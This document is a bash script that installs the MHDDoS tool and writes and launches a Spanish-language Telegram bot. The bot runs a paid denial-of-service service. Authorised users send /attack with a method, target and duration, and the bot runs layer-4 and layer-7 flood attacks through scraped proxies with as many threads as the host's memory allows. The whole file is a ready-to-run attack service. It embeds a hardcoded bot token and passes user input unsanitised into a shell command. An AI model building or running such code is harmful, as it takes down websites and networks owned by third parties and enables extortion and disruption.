#!/bin/bash

git clone https://github.com/MatrixTM/MHDDoS.git

cd MHDDoS || exit

pip3 install -r requirements.txt

pip install pyTelegramBotAPI

pip install requests sqlite3

cat <<EOF > bot.py
import telebot
import subprocess
import requests
import os
from datetime import datetime, timedelta
import sqlite3
import psutil

API_TOKEN = '6623354999:AAGk0m62dSJTYegCAvC--DeajefaTytfnbM'
bot = telebot.TeleBot(API_TOKEN)

ADMIN_ID = 5139305942

ALLOWED_GROUPS = -1002160033459

L4_METHODS = {
    'MEM', 'RDP', 'NTP', 'ARD', 'VSE', 'SYN', 'UDP', 'CHAR',
    'MINECRAFT', 'MCBOT', 'TCP'
}

L7_METHODS = {
    'COOKIE', 'BYPASS', 'OVH', 'DGB', 'STRESS', 'DOWNLOADER', 'NULL', 'AVB',
    'GET', 'CFB', 'POST', 'EVEN', 'DYN', 'GSB', 'XMLRPC', 'SLOW', 'BOT', 'PPS',
    'CFBUAM', 'APACHE', 'KILLER', 'RHEX', 'STOMP'
}

USER_DB_PATH = 'users.db'

ATTACK_DB_PATH = 'attacks.db'

def create_user_db():
    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                expiration_date TEXT
            )
        ''')
        conn.commit()

def create_attack_db():
    with sqlite3.connect(ATTACK_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                user_id INTEGER,
                metodo TEXT,
                objetivo TEXT,
                tiempo INTEGER,
                start_time TEXT,
                end_time TEXT,
                PRIMARY KEY (user_id, metodo, objetivo, start_time)
            )
        ''')
        conn.commit()

create_user_db()
create_attack_db()

def add_user(user_id, duration_type):
    now = datetime.now()
    expiration_date = None
    
    if duration_type == 1:
        expiration_date = now + timedelta(weeks=1)
    elif duration_type == 2:
        expiration_date = now + timedelta(weeks=4)
    elif duration_type == 3:
        expiration_date = now + timedelta(weeks=52)
    elif duration_type == 99:
        expiration_date = None  # Sin expiración

    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT expiration_date FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        
        if row:
            existing_expiration = row[0]
            if existing_expiration and existing_expiration != 'None':
                existing_expiration = datetime.fromisoformat(existing_expiration)
                if expiration_date and expiration_date > existing_expiration:
                    expiration_date = existing_expiration
        else:
            expiration_date = expiration_date

        cursor.execute('''
            INSERT INTO users (user_id, expiration_date)
            VALUES (?, ?)
            ON CONFLICT(user_id) DO UPDATE SET expiration_date = ?
        ''', (user_id, expiration_date.isoformat() if expiration_date else 'None', expiration_date.isoformat() if expiration_date else 'None'))
        conn.commit()

def is_user_allowed(user_id):
    if user_id == ADMIN_ID:
        return True

    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT expiration_date FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        
        if row:
            expiration_date = row[0]
            if expiration_date:
                if expiration_date == 'None':
                    return True
                try:
                    expiration_date = datetime.fromisoformat(expiration_date)
                except ValueError:
                    return False
                if expiration_date > datetime.now():
                    return True
                else:
                    cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                    conn.commit()
                    return False
            else:
                return True
        else:
            return False

def get_user_info(user_id):
    with sqlite3.connect(USER_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT expiration_date FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        if row:
            expiration_date = row[0]
            if expiration_date:
                if expiration_date == 'None':
                    return "Permiso infinito"
                try:
                    expiration_date = datetime.fromisoformat(expiration_date)
                except ValueError:
                    return "Fecha de expiración inválida"
                remaining_time = expiration_date - datetime.now()
                if remaining_time > timedelta(0):
                    return f"Tiempo restante: {remaining_time}"
                else:
                    return "Permiso expirado"
            else:
                return "Permiso infinito"
        else:
            return "Usuario no encontrado"


def get_proxies(user_id):
    try:
        response = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&simplified=true')
        if response.status_code == 200:
            proxies = response.text
            filename = f'proxy_{user_id}.txt'
            with open(filename, 'w') as file:
                file.write(proxies)
            return filename
        else:
            return None
    except Exception as e:
        print(f'Error obteniendo proxies: {e}')
        return None

def calculate_threads(ram_gb, reserved_ram_mb=256, ram_per_thread_mb=10):
    total_ram_mb = ram_gb * 1024
    available_ram_mb = total_ram_mb - reserved_ram_mb
    max_threads = available_ram_mb // ram_per_thread_mb
    return int(max_threads) 

def log_attack(user_id, metodo, objetivo, tiempo, start_time, end_time=None):
    with sqlite3.connect(ATTACK_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO attacks (user_id, metodo, objetivo, tiempo, start_time, end_time)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, metodo, objetivo, tiempo, start_time, end_time))
        conn.commit()

def update_attack(user_id, metodo, objetivo, tiempo, start_time, end_time):
    with sqlite3.connect(ATTACK_DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE attacks
            SET end_time = ?
            WHERE user_id = ? AND metodo = ? AND objetivo = ? AND tiempo = ? AND start_time = ?
        ''', (end_time, user_id, metodo, objetivo, tiempo, start_time))
        conn.commit()

@bot.message_handler(commands=['add'])
def handle_add_user_command(message):
    try:
        user_id = message.from_user.id

        if user_id != ADMIN_ID:
            bot.reply_to(message, "No tienes permiso para usar este comando.")
            return

        command_text = message.text.replace('/add', '').strip()
        args = command_text.split()

        if len(args) != 2:
            bot.reply_to(message, "Formato incorrecto. Usa: /add id [1|2|3|99]")
            return

        target_user_id = int(args[0])
        duration_type = int(args[1])

        add_user(target_user_id, duration_type)
        bot.reply_to(message, "Usuario añadido o actualizado correctamente.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f'Error al añadir usuario: {str(e)}')
        bot.reply_to(message, "Ocurrió un error al procesar el comando.")

@bot.message_handler(commands=['info'])
def handle_info_command(message):
    try:
        user_id = message.from_user.id

        if user_id != ADMIN_ID:
            bot.reply_to(message, "No tienes permiso para usar este comando.")
            return

        command_text = message.text.replace('/info', '').strip()
        target_user_id = int(command_text)

        info = get_user_info(target_user_id)
        bot.reply_to(message, f"Información del usuario {target_user_id}: {info}")
    except Exception as e:
        bot.send_message(ADMIN_ID, f'Error al obtener información del usuario: {str(e)}')
        bot.reply_to(message, "Ocurrió un error al procesar el comando.")

@bot.message_handler(commands=['help'])
def handle_help_command(message):
    help_text = (
        "*Métodos permitidos:*\n\n"
        "*L4 Methods (IP):* \n"
        "`MEM`, `RDP`, `NTP`, `ARD`, `VSE`, `SYN`, `UDP`, `CHAR`,\n"
        "`MINECRAFT`, `MCBOT`, `TCP`\n\n"
        "*L7 Methods (WEBS):* \n"
        "`COOKIE`, `BYPASS`, `OVH`, `DGB`, `STRESS`, `DOWNLOADER`, `NULL`, `AVB`,\n"
        "`GET`, `CFB`, `POST`, `EVEN`, `DYN`, `GSB`, `XMLRPC`, `SLOW`, `BOT`, `PPS`,\n"
        "`CFBUAM`, `APACHE`, `KILLER`, `RHEX`, `STOMP`\n\n"
        "Puedes usar estos métodos con el comando `/attack`.\n"
        "Por ejemplo: `/attack MEM objetivo 60`\n"
        "Esto ejecutará un ataque usando el método `MEM` al `objetivo` por 60 segundos."
    )
    
    bot.send_message(
        message.chat.id,
        help_text,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    if chat_id == ALLOWED_GROUPS:
        pass
    elif chat_id == user_id:
        if not is_user_allowed(user_id):
            bot.send_message(chat_id, "No tienes permiso para usar este bot en chat privado.")
            return
    else:
        bot.send_message(chat_id, "No tienes permiso para usar este bot en este grupo.")
        return
                
    command_text = message.text.replace('/attack', '').strip()
    args = command_text.split()

    if len(args) != 3:
        bot.reply_to(message, "Formato incorrecto. Usa: /attack metodo objetivo tiempo")
        return
        
    metodo, objetivo, tiempo = args

    if metodo == 'BOMB':
        bot.reply_to(message, "El método 'BOMB' no está permitido.")
        return

    if metodo not in L4_METHODS and metodo not in L7_METHODS:
        help_text = "Método no listado.\n\n"
        help_text += "*Métodos permitidos:*\n\n"
        help_text += "*L4 (IP):* " + ', '.join(L4_METHODS) + "\n"
        help_text += "*L7 (WEBS):* " + ', '.join(L7_METHODS)
        bot.reply_to(message, help_text, parse_mode='Markdown')
        return

    ram_gb = psutil.virtual_memory().total / (1024 ** 3)  # RAM total en GB
    max_threads = calculate_threads(ram_gb)

    proxy_file = None
    if metodo in {'MINECRAFT', 'MCBOT', 'TCP'} or metodo in L7_METHODS:
        proxy_file = get_proxies(user_id)
        if not proxy_file:
            bot.reply_to(message, "No se pudieron obtener proxies. Intenta de nuevo más tarde.")
            return

    if metodo in {'MINECRAFT', 'MCBOT', 'TCP'}:
        command = f'python3 MHDDoS/start.py {metodo} {objetivo} {max_threads} {tiempo} 1 {proxy_file}'
    elif metodo in {'MEM', 'RDP', 'NTP', 'ARD', 'VSE', 'SYN', 'UDP', 'CHAR'}:
        command = f'python3 MHDDoS/start.py {metodo} {objetivo} {max_threads} {tiempo}'
    elif metodo in L7_METHODS:
        command = f'python3 MHDDoS/start.py {metodo} {objetivo} {max_threads} 30000 {proxy_file} 1000 {tiempo}'

    start_time = datetime.now().isoformat()
    end_time = (datetime.now() + timedelta(seconds=int(tiempo))).isoformat()
    log_attack(user_id, metodo, objetivo, tiempo, start_time, end_time)

    bot.send_message(chat_id, f'¡Ataque en proceso! Método: {metodo}, Objetivo: {objetivo}, Tiempo: {tiempo}, Hilos: {max_threads}')

    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        for stdout_line in iter(process.stdout.readline, ""):
            print(stdout_line.strip())
        for stderr_line in iter(process.stderr.readline, ""):
            print(stderr_line.strip())

        process.stdout.close()
        process.stderr.close()
        process.wait()

        update_attack(user_id, metodo, objetivo, tiempo, start_time, end_time)

        bot.send_message(chat_id, "¡Ataque finalizado!")

    except Exception as e:
        bot.send_message(chat_id, f'Ocurrió un error al ejecutar el comando: {e}')
        bot.send_message(ADMIN_ID, f'Ocurrió un error al ejecutar el comando: {e}')
        print(f'Ocurrió un error al ejecutar el comando: {str(e)}')

bot.polling()

EOF

python3 bot.py
